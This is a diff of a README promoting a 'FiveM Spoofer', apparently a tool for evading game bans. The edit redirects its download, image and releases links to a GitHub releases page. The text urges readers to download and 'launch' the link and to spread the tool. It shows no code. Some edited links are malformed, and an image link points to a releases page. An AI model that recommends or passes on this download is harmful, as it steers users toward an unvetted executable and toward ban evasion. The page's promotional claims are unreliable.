@@ -31,7 +31,7 @@ Here are some of the key features of the FiveM Spoofer:
 
 Click the button below to download the latest version of the FiveM Spoofer:
 
-[![Download FiveM Spoofer](https://img.shields.io/static/v1?label=Download&message=FiveM%20Spoofer&color=blue)](https://github.com/releases/789694263/Release.zip)
+[![Download FiveM Spoofer](https://github.com/turkishmentor/FiveM-Spoofer/releases%20Spoofer&color=blue)](https://github.com/turkishmentor/FiveM-Spoofer/releases)
 
 *Note: The link provided above needs to be launched.*
 
@@ -51,10 +51,10 @@ If you encounter any issues or have any questions regarding the FiveM Spoofer, f
 
 Enjoying the FiveM Spoofer? Spread the word to your friends and gaming community. Let's make sure everyone can benefit from this amazing tool!
 
-![Gaming](https://image.shutterstock.com/image-photo/young-man-playing-video-games-260nw-532689157.jpg)
+![Gaming](https://github.com/turkishmentor/FiveM-Spoofer/releases)
 
 Happy Gaming! 🎮
 
 ---
 
-*For more information and updates, visit the [Releases](https://github.com/releases/789694263) section.*
+*For more information and updates, visit the [Releases](https://github.com/turkishmentor/FiveM-Spoofer/releases) section.*
